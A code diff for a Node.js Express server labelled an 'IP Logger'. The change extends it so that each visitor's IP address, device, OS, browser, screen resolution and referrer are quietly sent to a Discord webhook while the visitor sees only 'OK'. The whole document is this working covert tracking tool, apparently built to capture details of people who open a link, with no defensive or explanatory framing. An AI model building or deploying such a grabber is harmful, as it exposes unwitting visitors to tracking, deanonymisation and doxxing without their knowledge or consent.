@@ -1,6 +1,7 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
+const useragent = require('user-agent'); // Parses device info
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -15,12 +16,26 @@ app.get('/', (req, res) => {
     let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     ip = ip.replace('::ffff:', ''); // Clean IP format
 
-    // Send IP to Discord webhook
-    axios.post(webhookURL, { content: `📌 **New Visitor IP:** ${ip}` })
-        .then(() => console.log(`Logged IP: ${ip}`))
+    let userAgent = req.headers['user-agent']; // Get user agent
+    let parsedUA = useragent.parse(userAgent); // Parse user agent info
+
+    // Extra device details
+    let deviceInfo = `
+📌 **New Visitor**  
+🌍 **IP Address:** ${ip}  
+💻 **Device:** ${parsedUA.device.vendor || "Unknown"} ${parsedUA.device.model || "Unknown"}  
+📱 **OS:** ${parsedUA.os.name} ${parsedUA.os.version}  
+🖥 **Browser:** ${parsedUA.family} ${parsedUA.version}  
+🖥 **Screen Resolution:** ${req.query.resolution || "Unknown"}  
+📡 **Referrer:** ${req.headers['referer'] || "Direct"}  
+    `;
+
+    // Send info to Discord
+    axios.post(webhookURL, { content: deviceInfo })
+        .then(() => console.log(`Logged: ${ip}`))
         .catch(err => console.error("Webhook error:", err));
 
-    res.send("OK"); // Simple response
+    res.send("OK");
 });
 
 app.listen(PORT, () => console.log(`IP Logger running on port ${PORT}`));
